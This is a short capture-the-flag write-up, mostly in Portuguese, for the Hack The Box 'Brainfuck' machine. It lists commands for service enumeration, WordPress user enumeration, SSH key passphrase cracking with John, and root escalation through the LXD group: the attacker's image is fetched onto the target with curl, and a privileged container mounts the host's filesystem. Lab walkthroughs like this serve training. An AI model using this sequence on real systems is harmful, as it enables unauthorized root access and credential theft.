# HTB - WRITE UP - Brainfuck 
## POC: https://www.redteamzone.seg.br/2022/10/brainfuck-htb-writeup-lxc-group.html

# Enumeração 
## NMAP Geral
```
nmap -Pn -sV [IP]
```

## NMAP específico para cada serviço 

## SSH
```
nmap -Pn -p 22 --script="ssh-*" [IP]
```

## SMTP
```
nmap -Pn -p 25 --script="smtp-*" [IP]
```

## POP3
```
nmap -Pn -p 110 --script="pop3-*" [IP]
```

## IMAP
```
nmap -Pn -p 143 --script="imap-*" [IP]
```

## HTTPS
```
nmap -Pn -p 443 -sV -sC [IP]
```

## Fuzzing
```
ffuf -r -c -w directory-list-2.3-medium.txt:FUZZ -u [URL]FUZZ
```

## WPScan
```
wpscan --url [IP] --api-token [token] --random-user-agent --disable-tls-checks
```

## WPScan - Enumeração de usuários
```
wpscan --url [URL] --api-token [IP] --random-user-agent --disable-tls-checks --enumerate u
```

## WP Support Plus Responsive Ticket System 7.1.3 Privilege Escalation
https://wpscan.com/vulnerability/b1808005-0809-4ac7-92c7-1f65e410ac4f


## Exploit
https://www.exploit-db.com/exploits/41006


## Email-Client Evolution
```
apt-get install evolution
```

## Decrypt Cifra de Vigenére
[Script](https://github.com/carineconstantino/pentest-scripts/tree/main/python/cifra-de-vigenere)


## DCode
https://www.dcode.fr/vigenere-cipher


## Cracking Passphase public-key
```
/usr/share/john
python ssh2john.py id_rsa > id_rsa.hash
```

## John to cracking 
```
john id_rsa.hash -wordlist=rockyou.txt 
```

## RSA Decrypt
[Fonte](https://0xdf.gitlab.io/2022/05/16/htb-brainfuck.html)<p>
[Script](https://github.com/carineconstantino/pentest-scripts/tree/main/python/RSA-Decrypt)

## Recon Interno
```
cat /etc/os-release
cat /proc/version
```

## Identificando PATHs de variáveis do sistema nos quais o usuário tem permissão
```
echo $PATH
```

## SNAP Version
```
snap --version 
```

## SUDO Version
```
sudo --version
```

## Localizando binários instalados no servidor 
```
which [nome-do-binario]
```

## Identificando os grupos nos quais o usuário pertence 
```
id
```

## LXC Exploit
Ferramenta: https://github.com/saghul/lxd-alpine-builder
```
./build-alpine
```

## Download da imagem na máquina-alvo
```
curl -o image.tar.gz  http://[IP]:8080/alpine-v3.16-x86_64-20221022_1050.tar.gz
```

## Import da imagem 
```
lxc image import ./image.tar.gz --alias myimage
```

## LXC List
```
lxc image list
```

## Inicia imagem com a flag security-privileged=true
```
lxc init myimage ignite -c security.privileged=true
```

## Monta o diretório root do container 
```
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true 
```

## Inicia o container
```
lxc start ignite
```

## Executa a shell
```
lxc exec ignite /bin/sh 
```
